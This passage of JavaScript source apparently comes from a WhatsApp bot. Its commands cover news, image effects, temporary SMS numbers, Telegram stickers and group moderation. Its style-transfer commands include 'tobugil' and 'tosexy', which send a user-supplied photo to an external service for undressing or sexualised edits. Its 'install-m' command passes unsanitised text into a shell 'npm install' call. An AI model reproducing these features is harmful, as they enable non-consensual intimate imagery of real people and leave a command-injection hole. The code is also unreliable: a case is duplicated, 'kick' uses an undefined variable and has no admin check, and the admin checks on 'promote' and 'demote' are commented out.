case 'cnbc':
case 'cnn':
case 'kompas':
case 'merdeka':
case 'sindonews':
case 'suara': {
  await reaction('📰');

  // Map command to API endpoint and data extractor
  const newsMap = {
    antara: {
      url: 'https://api.siputzx.my.id/api/berita/antara',
      extract: (item) => ({
        title: item.title,
        image: item.image,
        link: item.link,
        category: item.category,
        date: item.date || 'N/A',
        desc: item.description || item.type || ''
      })
    },
    cnbc: {
      url: 'https://api.siputzx.my.id/api/berita/cnbcindonesia',
      extract: (item) => ({
        title: item.title,
        image: item.image,
        link: item.link,
        category: item.category,
        date: item.date || 'N/A',
        desc: ''
      })
    },
    cnn: {
      url: 'https://api.siputzx.my.id/api/berita/cnn',
      extract: (item) => ({
        title: item.title,
        image: item.image_full || item.image,
        link: item.link,
        category: 'N/A',
        date: item.time || item.date || 'N/A',
        desc: item.content || ''
      })
    },
    kompas: {
      url: 'https://api.siputzx.my.id/api/berita/kompas',
      extract: (item) => ({
        title: item.title,
        image: item.image,
        link: item.link,
        category: item.category,
        date: item.date || 'N/A',
        desc: ''
      })
    },
    merdeka: {
      url: 'https://api.siputzx.my.id/api/berita/merdeka',
      extract: (item) => ({
        title: item.title,
        image: item.image,
        link: item.link,
        category: 'N/A',
        date: item.date || 'N/A',
        desc: item.description || ''
      })
    },
    sindonews: {
      url: 'https://api.siputzx.my.id/api/berita/sindonews',
      extract: (item) => ({
        title: item.title,
        image: item.imageUrl || item.image,
        link: item.link,
        category: item.category,
        date: item.timestamp || item.date || 'N/A',
        desc: ''
      })
    },
    suara: {
      url: 'https://api.siputzx.my.id/api/berita/suara',
      extract: (item) => ({
        title: item.title,
        image: item.image,
        link: item.link,
        category: item.category,
        date: item.date || 'N/A',
        desc: ''
      })
    }
  };

  const config = newsMap[cmd];
  if (!config) break;

  try {
    const { data } = await axios.get(config.url, { timeout: 15000 });
    if (!data?.data || data.data.length === 0) {
      await reply(`❌ No news available from ${cmd.toUpperCase()}.`);
      break;
    }

    const first = data.data[0];
    const extracted = config.extract(first);

    const msg = `📰 *${cmd.toUpperCase()} News*\n\n` +
                `*${extracted.title}*\n\n` +
                (extracted.desc ? `${extracted.desc}\n\n` : '') +
                `📂 Category: ${extracted.category}\n` +
                `📅 ${extracted.date}\n\n` +
                `🔗 [Read more](${extracted.link})`;

    if (extracted.image) {
      try {
        const buffer = await getBuffer(extracted.image);
        await sock.sendMessage(jid, { image: buffer, caption: msg }, { quoted: m });
      } catch {
        await reply(msg);
      }
    } else {
      await reply(msg);
    }
  } catch (e) {
    console.error('[NEWS]', e);
    await reply(`❌ Failed to fetch ${cmd} news: ${e.message}`);
  }
  break;
}
// ─── IMAGE EFFECTS ──────────────────────────────────────

// ──────────────────────────────────────────────────────────
//  EPHOTO 360 – text effect generators
// ──────────────────────────────────────────────────────────

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloyellowneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects': {
  const userText = text.trim();
  if (!userText) {
    await reply(`🎨 *${cmd.toUpperCase()}*\nUsage: .${cmd} <text>\nExample: .${cmd} Hello World`);
    break;
  }
  await reaction('🎨');

  const linkMap = {
    glitchtext: 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html',
    writetext: 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html',
    advancedglow: 'https://en.ephoto360.com/advanced-glow-effects-74.html',
    typographytext: 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html',
    pixelglitch: 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html',
    neonglitch: 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html',
    flagtext: 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html',
    flag3dtext: 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html',
    deletingtext: 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html',
    blackpinkstyle: 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html',
    glowingtext: 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html',
    underwatertext: 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html',
    logomaker: 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html',
    cartoonstyle: 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html',
    papercutstyle: 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html',
    watercolortext: 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html',
    effectclouds: 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html',
    blackpinklogo: 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html',
    gradienttext: 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html',
    summerbeach: 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html',
    luxurygold: 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html',
    multicoloyellowneon: 'https://en.ephoto360.com/create-multicoloyellow-neon-light-signatures-591.html',
    sandsummer: 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html',
    galaxywallpaper: 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html',
    '1917style': 'https://en.ephoto360.com/1917-style-text-effect-523.html',
    makingneon: 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html',
    royaltext: 'https://en.ephoto360.com/royal-text-effect-online-free-471.html',
    freecreate: 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html',
    galaxystyle: 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html',
    lighteffects: 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html',
  };

  const link = linkMap[cmd];
  if (!link) {
    await reply('❌ Invalid ephoto command.');
    break;
  }

  try {
    const resultImage = await ephoto(link, userText);
    await sock.sendMessage(jid, {
      image: resultImage,
      caption: `🎨 *${cmd.toUpperCase()}*\nText: ${userText}`
    }, { quoted: m });
  } catch (e) {
    console.error('[EPHOTO]', e);
    await reply(`❌ Failed to generate effect: ${e.message}`);
  }
  break;
}

// ──────────────────────────────────────────────────────────
//  STYLE TRANSFER – image to anime, cartoon, etc.
// ──────────────────────────────────────────────────────────

case 'toanime':
case 'tobersama':
case 'toblonde':
case 'tobotak':
case 'tohijab':
case 'tomekah':
case 'tomirror':
case 'tovintage':
case 'tofigura':
case 'tofigurav2':
case 'tofigurav3':
case 'tobabi':
case 'tobrewok':
case 'tochibi':
case 'todpr':
case 'toghibli':
case 'tojepang':
case 'tokacamata':
case 'tolego':
case 'tomaya':
case 'tomoai':
case 'toreal':
case 'tosd':
case 'tosatan':
case 'tosdmtinggi':
case 'tosad':
case 'tosexy':
case 'tobugil':
case 'toputih':
case 'tohitam':
case 'edit': {
  await reaction('🎨');

  // ── Get image from reply or URL ──
  let imageUrl = null;
  let imageBuffer = null;
  const q = m.quoted || m;
  const mime = (q.msg || q).mimetype || '';

  // 1) Direct image in message
  if (m.message?.imageMessage) {
    try {
      imageBuffer = await dlMedia({ imageMessage: m.message.imageMessage }, m.key);
      imageUrl = await uploadToCatbox(imageBuffer, 'style.jpg');
    } catch {}
  }

  // 2) Quoted image
  if (!imageUrl && q.mimetype && /image/.test(q.mimetype)) {
    try {
      imageBuffer = await dlMedia(q.msg || q, q.key || m.key);
      imageUrl = await uploadToCatbox(imageBuffer, 'style.jpg');
    } catch {}
  }

  // 3) URL argument
  if (!imageUrl && text && text.startsWith('http')) {
    imageUrl = text.trim();
    try {
      imageBuffer = await getBuffer(imageUrl);
    } catch {}
  }

  // ── Special: `edit` command needs a prompt ──
  if (cmd === 'edit') {
    if (!imageUrl) {
      await reply(`✏️ *Edit Image*\nReply to an image with: .edit <prompt>\nExample: .edit make it look like a painting`);
      break;
    }
    const prompt = args.join(' ');
    if (!prompt) {
      await reply('❌ Please provide a prompt: .edit <description>');
      break;
    }
    try {
      const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(prompt)}`;
      const { data } = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
      await sock.sendMessage(jid, {
        image: Buffer.from(data),
        caption: `✏️ *Edit complete*\nPrompt: ${prompt}`
      }, { quoted: m });
    } catch (e) {
      await reply(`❌ Edit failed: ${e.message}`);
    }
    break;
  }

  if (!imageUrl) {
    await reply(`🖼️ *${cmd.toUpperCase()}*\nReply to an image with: .${cmd}\nOr provide an image URL: .${cmd} https://...`);
    break;
  }

  try {
    // ── Special: `tobersama` needs a celebrity name ──
    let apiCmd = cmd;
    let extraParam = '';
    if (cmd === 'tobersama') {
      const celebrity = text.trim();
      if (!celebrity) {
        await reply('👤 *To Bersama*\nPlease provide a celebrity name: .tobersama <name>\nExample: .tobersama Kim Kardashian');
        break;
      }
      extraParam = `&nama-artis=${encodeURIComponent(celebrity)}`;
    }

    const apiUrl = `https://api-faa.my.id/faa/${apiCmd}?url=${encodeURIComponent(imageUrl)}${extraParam}`;
    const { data } = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 60000 });
    await sock.sendMessage(jid, {
      image: Buffer.from(data),
      caption: `🎨 *${cmd.toUpperCase()}* completed!`
    }, { quoted: m });
  } catch (e) {
    console.error('[STYLE]', e);
    await reply(`❌ Style transfer failed: ${e.message}`);
  }
  break;
}

// ──────────────────────────────────────────────────────────
//  REMOVE WATERMARK
// ──────────────────────────────────────────────────────────

case 'removewm':
case 'rwm':
case 'removewatermark': {
  await reaction('🧹');
  const q = m.quoted || m;
  const mime = (q.msg || q).mimetype || '';
  if (!/image/.test(mime)) {
    await reply(`🖼️ *Remove Watermark*\nReply to an image with: .removewm`);
    break;
  }

  try {
    await sock.sendMessage(jid, { text: '⏳ Removing watermark...' }, { quoted: m });
    const mediaBuffer = await dlMedia(q.msg || q, q.key || m.key);
    const tmpPath = `./tmp/removewm_${Date.now()}.jpg`;
    fs.writeFileSync(tmpPath, mediaBuffer);

    const result = await ezremove(tmpPath);
    if (!result || !result.result) {
      throw new Error('Failed to remove watermark');
    }

    const resultBuffer = await getBuffer(result.result);
    await sock.sendMessage(jid, {
      image: resultBuffer,
      caption: '✅ *Watermark removed!*'
    }, { quoted: m });

    fs.unlinkSync(tmpPath);
  } catch (e) {
    console.error('[REMOVEWM]', e);
    await reply(`❌ Failed to remove watermark: ${e.message}`);
  }
  break;
}
// ── Feature Request ──
case 'req': {
  if (needOwner()) break;
  const reqText = args.join(' ');
  if (!reqText) { await reply(`📝 ${prefix}req <your request>`); break; }
  const reqFile = DB('requests.json');
  const data = readJSON(reqFile, []);
  data.push({ user: sender, request: reqText, date: new Date().toISOString() });
  writeJSON(reqFile, data);
  await reply('✅ Request submitted.');
  break;
}

// ── List Requests ──
case 'listreq': {
  if (needOwner()) break;
  const reqFile = DB('requests.json');
  const data = readJSON(reqFile, []);
  if (!data.length) return reply('📭 No requests.');
  let msg = '📋 *Requests*\n\n';
  data.forEach((r, i) => {
    msg += `${i+1}. @${r.user.split('@')[0]}: ${r.request}\n`;
  });
  await reply(msg, { mentions: data.map(r => r.user) });
  break;
}

// ── Delete Request ──
case 'delreq': {
  if (needOwner()) break;
  const index = parseInt(args[0]) - 1;
  if (isNaN(index) || index < 0) { await reply(`🗑️ ${prefix}delreq <index>\nUse .listreq to see indexes.`); break; }
  const reqFile = DB('requests.json');
  const data = readJSON(reqFile, []);
  if (!data[index]) return reply('❌ Request not found.');
  data.splice(index, 1);
  writeJSON(reqFile, data);
  await reply('🗑️ Request deleted.');
  break;
}

// ── Add Balance ──
case 'addsaldo': {
  if (needOwner()) break;
  const target = getTargetJid(m, args);
  const amount = parseInt(args[args.length - 1]);
  if (!target || isNaN(amount) || amount < 1) {
    await reply(`💰 ${prefix}addsaldo <@mention> <amount>\nExample: ${prefix}addsaldo @user 1000`);
    break;
  }
  if (!db.users[target]) db.users[target] = { saldo: 0 };
  db.users[target].saldo = (db.users[target].saldo || 0) + amount;
  saveDb();
  await reply(`✅ Added ${amount} balance to @${target.split('@')[0]}.`, { mentions: [target] });
  break;
}

// ── Install NPM Module ──
case 'install-m': {
  if (needOwner()) break;
  const moduleName = args[0];
  if (!moduleName) { await reply(`📦 ${prefix}install-m <module_name>\nExample: ${prefix}install-m axios`); break; }
  await reply(`⏳ Installing ${moduleName}...`);
  const exec = require('child_process').exec;
  exec(`npm install ${moduleName}`, (err, stdout, stderr) => {
    if (err) return reply(`❌ ${err.message}`);
    reply(`✅ Installed ${moduleName}.\n\n${stdout.slice(0, 500)}`);
  });
  break;
}
// ════════════════════════════════════════════════════════════
//   TEMPORARY NUMBER – API 1 (receive-sms-online)
// ════════════════════════════════════════════════════════════
case 'getnumber1':
case 'getnumber': {   // alias
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      'https://apis.davidcyril.name.ng/tempnumber/receive-sms-online/numbers',
      { timeout: 15000 }
    );
    if (!data.success || !data.result?.numbers?.length) {
      return reply('❌ No temporary numbers available right now. Try again later.');
    }
    const numData = data.result.numbers[0];
    // Store for this user (global in memory)
    if (!global.lastTempNumber) global.lastTempNumber = {};
    global.lastTempNumber[sender] = {
      number: numData.number,
      slug: numData.slug || `${numData.number}-${numData.country}`,
      country: numData.country
    };
    const result = `✅ *Temporary Number Fetched!*\n\n` +
                   `🌍 *Country:* ${numData.country}\n` +
                   `📞 *Number:* ${numData.number}\n` +
                   `🔗 *Slug:* ${numData.slug || 'N/A'}\n\n` +
                   `📲 *Next Step:*\n` +
                   `Use \`${prefix}getsms\` to check inbox\n\n` +
                   `⏳ Wait a few seconds after using the number before checking.`;
    await reply(result);
  } catch (err) {
    console.error('Get Number Error:', err);
    reply(`❌ Failed to fetch number: ${err.message}`);
  }
  break;
}

case 'getsms':
case 'tempinbox':
case 'checksms': {
  if (!global.lastTempNumber || !global.lastTempNumber[sender]) {
    return reply(`❌ You haven't fetched a number yet.\nUse \`${prefix}getnumber1\` first.`);
  }
  const lastNum = global.lastTempNumber[sender];
  const slug = lastNum.slug;
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      `https://apis.davidcyril.name.ng/tempnumber/receive-sms-online/inbox?number=${encodeURIComponent(slug)}`,
      { timeout: 15000 }
    );
    if (!data.success) {
      return reply(`❌ Failed to fetch inbox for ${lastNum.number}.`);
    }
    let result = `📩 *Inbox for:* ${lastNum.number} (${lastNum.country})\n\n`;
    if (!data.result.messages || data.result.messages.length === 0) {
      result += `📭 *No messages received yet.*\n\n`;
      result += `💡 *Tip:* Use the number somewhere, then wait 5-10 seconds and run \`${prefix}getsms\` again.`;
    } else {
      result += `📊 *Total Messages:* ${data.result.messages.length}\n\n`;
      result += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      data.result.messages.forEach((msg, i) => {
        result += `*${i+1}.* 📱 From: ${msg.from || 'Unknown'}\n`;
        result += `📝 Message: ${msg.content || msg.text || msg.message || 'No content'}\n`;
        result += `⏰ Time: ${msg.time || msg.date || 'Unknown'}\n\n`;
      });
    }
    result += `\n🔄 Run \`${prefix}getsms\` again to refresh.`;
    await reply(result);
  } catch (err) {
    console.error('Inbox Error:', err);
    reply(`❌ Error checking inbox: ${err.message}`);
  }
  break;
}

// ════════════════════════════════════════════════════════════
//   TEMPORARY NUMBER – API 2 (SMS24)
// ════════════════════════════════════════════════════════════
case 'getnumber2': {
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      'https://apis.davidcyril.name.ng/tempnumber/sms24/numbers',
      { timeout: 15000 }
    );
    if (!data.success || !data.result?.numbers?.length) {
      return reply('❌ No SMS24 numbers available right now. Try again later.');
    }
    const numData = data.result.numbers[0];
    if (!global.lastSms24Number) global.lastSms24Number = {};
    global.lastSms24Number[sender] = {
      number: numData.number,
      country: numData.country || 'N/A'
    };
    const result = `✅ *SMS24 Number Fetched!*\n\n` +
                   `🌍 *Country:* ${numData.country || 'N/A'}\n` +
                   `📞 *Number:* ${numData.number}\n\n` +
                   `📲 *Next Step:*\n` +
                   `Use \`${prefix}getsms2\` to check inbox automatically.\n\n` +
                   `⏳ Use the number first, then wait a bit before checking.`;
    await reply(result);
  } catch (err) {
    console.error('SMS24 Get Number Error:', err);
    reply(`❌ Failed to fetch SMS24 number: ${err.message}`);
  }
  break;
}

case 'getsms2':
case 'sms24inbox': {
  if (!global.lastSms24Number || !global.lastSms24Number[sender]) {
    return reply(`❌ You haven't fetched an SMS24 number yet.\nUse \`${prefix}getnumber2\` first.`);
  }
  const lastNum = global.lastSms24Number[sender];
  const number = lastNum.number;
  await sock.sendPresenceUpdate('composing', jid);
  try {
    const { data } = await axios.get(
      `https://apis.davidcyril.name.ng/tempnumber/sms24/inbox?number=${encodeURIComponent(number)}`,
      { timeout: 15000 }
    );
    if (!data.success) {
      return reply(`❌ Failed to fetch inbox for ${number}.`);
    }
    let result = `📩 *SMS24 Inbox for:* ${number} (${lastNum.country})\n\n`;
    if (!data.result.messages || data.result.messages.length === 0) {
      result += `📭 *No messages received yet.*\n\n`;
      result += `💡 *Tip:* Use the number somewhere, wait 5-15 seconds, then run \`${prefix}getsms2\` again.`;
    } else {
      result += `📊 *Total Messages:* ${data.result.messages.length}\n\n`;
      result += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      data.result.messages.forEach((msg, i) => {
        result += `*${i+1}.* 📱 From: ${msg.from || 'Unknown'}\n`;
        result += `📝 Message: ${msg.content || msg.text || msg.message || 'No content'}\n`;
        result += `⏰ Time: ${msg.time || msg.date || 'Unknown'}\n\n`;
      });
    }
    result += `\n🔄 Run \`${prefix}getsms2\` again to refresh.`;
    await reply(result);
  } catch (err) {
    console.error('SMS24 Inbox Error:', err);
    reply(`❌ Error checking inbox: ${err.message}`);
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   GROUP – EXISTING
    // ══════════════════════════════════════════════════════
case 'tgstickers':
case 'tgsticker':
case 'telegramsticker': {
    if (!text) {
        return sock.sendMessage(jid, {
            text: `❌ Usage: .tgstickers <Telegram sticker pack link>\nExample: .tgstickers https://t.me/addstickers/AnimePack`
        }, { quoted: m });
    }

    try {
        await reaction('⏳');

        let packUrl = text.trim();
        if (!packUrl.includes("t.me/addstickers/")) {
            return sock.sendMessage(jid, {
                text: "❌ Invalid Telegram sticker pack link."
            }, { quoted: m });
        }

        // Extract pack name
        let packName = packUrl.split("/addstickers/")[1];
        if (packName.includes("/")) packName = packName.split("/")[0];

        // Get token from settings
        const botToken = settings.TELEGRAM_BOT_TOKEN;
        if (!botToken) {
            return sock.sendMessage(jid, {
                text: "❌ Telegram bot token not configured.\nAdd TELEGRAM_BOT_TOKEN to settings."
            }, { quoted: m });
        }

        // Fetch sticker pack from Telegram
        const api = `https://api.telegram.org/bot${botToken}/getStickerSet?name=${packName}`;
        const { data } = await axios.get(api, { timeout: 15000 });

        if (!data.ok) {
            return sock.sendMessage(jid, {
                text: `❌ Failed to fetch sticker pack: ${data.description || 'Unknown error'}`
            }, { quoted: m });
        }

        const stickers = data.result.stickers;
        if (!stickers || stickers.length === 0) {
            return sock.sendMessage(jid, {
                text: "❌ No stickers found in this pack."
            }, { quoted: m });
        }

        await sock.sendMessage(jid, {
            text: `✅ Found ${stickers.length} stickers. Sending now...`
        }, { quoted: m });

        let sent = 0;
        let failed = 0;

        for (let i = 0; i < stickers.length; i++) {
            try {
                // Get file path
                const filePathRes = await axios.get(
                    `https://api.telegram.org/bot${botToken}/getFile?file_id=${stickers[i].file_id}`,
                    { timeout: 10000 }
                );
                const fileUrl = `https://api.telegram.org/file/bot${botToken}/${filePathRes.data.result.file_path}`;

                // Handle animated stickers (.tgs)
                if (fileUrl.endsWith(".tgs")) {
                    const tgsBuffer = await getBuffer(fileUrl);
                    const tgsPath = `./tmp/tg_${Date.now()}_${i}.tgs`;
                    const webpPath = `./tmp/tg_${Date.now()}_${i}.webp`;

                    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');

                    fs.writeFileSync(tgsPath, tgsBuffer);

                    try {
                        // Convert TGS to WEBP using ffmpeg
                        await new Promise((resolve, reject) => {
                            exec(
                                `ffmpeg -i ${tgsPath} -c:v libwebp -lossless 1 ${webpPath} -y 2>/dev/null`,
                                (error) => {
                                    if (error) reject(error);
                                    else resolve();
                                }
                            );
                        });

                        const buffer = fs.readFileSync(webpPath);
                        await sock.sendMessage(jid, { sticker: buffer }, { quoted: m });

                        sent++;
                        fs.unlinkSync(tgsPath);
                        fs.unlinkSync(webpPath);

                    } catch (convError) {
                        // Fallback: send as document
                        await sock.sendMessage(jid, {
                            document: tgsBuffer,
                            fileName: `sticker_${i+1}.tgs`,
                            mimetype: "application/octet-stream",
                            caption: `⚠️ Animated sticker #${i+1} (TGS format)`
                        }, { quoted: m });
                        fs.unlinkSync(tgsPath);
                        sent++;
                    }

                } else {
                    // Static sticker (WEBP/PNG)
                    const buffer = await getBuffer(fileUrl);
                    await sock.sendMessage(jid, { sticker: buffer }, { quoted: m });
                    sent++;
                }

                // Delay to avoid rate limiting
                await sleep(800);

            } catch (err) {
                console.log(`[tgstickers] Sticker ${i+1} error:`, err.message);
                failed++;
            }
        }

        await reaction('✅');

        await sock.sendMessage(jid, {
            text: `✅ Complete!\n📤 Sent: ${sent} stickers\n❌ Failed: ${failed}`
        }, { quoted: m });

    } catch (e) {
        console.error('[tgstickers] Error:', e);
        await sock.sendMessage(jid, {
            text: `❌ Error: ${e.message || 'Unknown error'}`
        }, { quoted: m });
    }
    break;
}
    case 'promote': {
    if (needOwner()) break;
    if (!isGroup) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐆𝐫𝐨𝐮𝐩 𝐨𝐧𝐥𝐲
└ ❏

`;
        await reply(replyText);
        break;
    }
  /*  if (!isBotAdmins) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐀𝐝𝐝 𝐛𝐨𝐭 𝐚𝐬 𝐚𝐝𝐦𝐢𝐧 𝐟𝐢𝐫𝐬𝐭
└ ❏

`;
        await reply(replyText);
        break;
    }*/
    const t = getTargetJid(m, args);
    if (!t) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐀𝐆𝐄: .𝐩𝐫𝐨𝐦𝐨𝐭𝐞 (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐦𝐛𝐞𝐫)
└ ❏

`;
        await reply(replyText);
        break;
    }
    await sock.groupParticipantsUpdate(jid, [t], 'promote');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐏𝐑𝐎𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐄𝐑: @${normNum(t)}
├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ✅ 𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝
└ ❏

`;
    await reply(replyText);
    break;
}

case 'demote': {
    if (needOwner()) break;
    if (!isGroup) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐆𝐫𝐨𝐮𝐩 𝐨𝐧𝐥𝐲
└ ❏

`;
        await reply(replyText);
        break;
    }
   /* if (!isBotAdmins) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ❌ 𝐀𝐝𝐝 𝐛𝐨𝐭 𝐚𝐬 𝐚𝐝𝐦𝐢𝐧 𝐟𝐢𝐫𝐬𝐭
└ ❏

`;
        await reply(replyText);
        break;
    }*/
    const t = getTargetJid(m, args);
    if (!t) {
        const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐀𝐆𝐄: .𝐝𝐞𝐦𝐨𝐭𝐞 (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧)
└ ❏

`;
        await reply(replyText);
        break;
    }
    await sock.groupParticipantsUpdate(jid, [t], 'demote');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐃𝐄𝐌𝐎𝐓𝐄⌟ ⫹⫺ 

├⫹⫺  𝐔𝐒𝐄𝐑: @${normNum(t)}
├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: ✅ 𝐃𝐞𝐦𝐨𝐭𝐞𝐝
└ ❏

`;
    await reply(replyText);
    break;
}

case 'unmute': {
    if (needGroup() || needAdmin()) break;
    await sock.groupSettingUpdate(jid, 'not_announcement');
    const replyText = `

┌ ❏ ⫹⫺  ⌜𝐔𝐍𝐌𝐔𝐓𝐄 𝐆𝐑𝐎𝐔𝐏⌟ ⫹⫺ 

├⫹⫺  𝐒𝐓𝐀𝐓𝐔𝐒: 🔊 𝐆𝐫𝐨𝐮𝐩 𝐮𝐧𝐦𝐮𝐭𝐞𝐝
├⫹⫺  𝐍𝐎𝐓𝐄: 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝
└ ❏

`;
    await reply(replyText);
    break;
}

    case 'kick': {
      if (needGroup() ) break;
      const t = getTargetJid(m, args); if (!t) { await reply('❌ Reply to a member.'); break; }
      await sock.groupParticipantsUpdate(jid, [t], 'remove');
      await reply(`✅ 🕣⃝⃘̉̉⃝⃪

┌ ❏ ◆ ⌜𝐊𝐈𝐂𝐊⌟ ◆
│
├◆ 𝐔𝐒𝐄𝐑: @${target.split('@')[0]}
├◆ 𝐒𝐓𝐀𝐓𝐔𝐒: ✅ Removed
└ ❏.`);
      break;
    }

    case 'mute': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'announcement');
      await reply('🔇 Group muted. Only admins can send messages.');
      break;
    }

    case 'unmute': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'not_announcement');
      await reply('🔊 Group unmuted. Everyone can send messages.');
      break;
    }

    case 'lock': {
      if (needGroup()) break;
      await sock.groupSettingUpdate(jid, 'locked');
      await reply('🔒 Group info locked to admins.');
      break;
    }

    case 'unlock': {
      if (needGroup() ) break;
      await sock.groupSettingUpdate(jid, 'unlocked');
      await reply('🔓 Group info open to all.');
      break;
    }
case 'testmenu': {
  await reaction('🌹');

  // ── Main menu image (URL) ──
  const menuImg = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://i.imgur.com/your-default-image.jpg';

  // ── Thumbnail – load from local file ──
  const thumbPath = c.thumbnail2 || settings.DEFAULT_MENU_IMG || './helper/thumb.jpg';
  let thumbBuffer = null;
  try {
    if (fs.existsSync(thumbPath)) thumbBuffer = fs.readFileSync(thumbPath);
  } catch {}

  // ── Status values (safe fallbacks) ──
  const myName = pushname || 'User';
  const myNumber = senderNumber || 'Unknown';
  const myStatus = _isOwner ? '𝗢𝘄𝗻𝗲𝗿' : isPremium ? '𝗣𝗿𝗲𝗺𝗶𝘂𝗺' : '𝗙𝗿𝗲𝗲';
  const myMode = sock.public ? '𝗣𝘂𝗯𝗹𝗶𝗰' : '𝗦𝗲𝗹𝗳';
  const myUptime = typeof runtime === 'function' ? runtime(process.uptime()) : formatUptime(process.uptime() * 1000);
  const totalFitur = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
  const botName = c.botName || settings.BOT_NAME || '𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃  𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒';
  const latensi = (performance.now() - performance.now()).toFixed(4);

  // ── Status caption (styled with ft) ──
  const statusCaption = ft(`
•━═ 〘  < 〙═━• 

> ╭═━⪩〘 𝑿𝑯𝒀𝑷𝑯𝑬𝑹 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐
> │⫹⫺ 𝗡𝗮𝗺𝗲        : ${myName}
> │⫹⫺ 𝗡𝘂𝗺𝗯𝗲𝗿      : ${myNumber}
> │⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀      : ${myStatus}
> │⫹⫺ 𝗟𝗶𝗺𝗶𝘁       : 0
> │⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲    : ${botName}
> │⫹⫺ 𝗨𝗽𝘁𝗶𝗺𝗲      : ${myUptime}
> │⫹⫺ 𝗠𝗼𝗱𝗲        : ${myMode}
> │⫹⫺ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀    : ${totalFitur} 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀
> │⫹⫺ 𝗨𝘀𝗲𝗿𝘀       : 0 𝘂𝘀𝗲𝗿𝘀
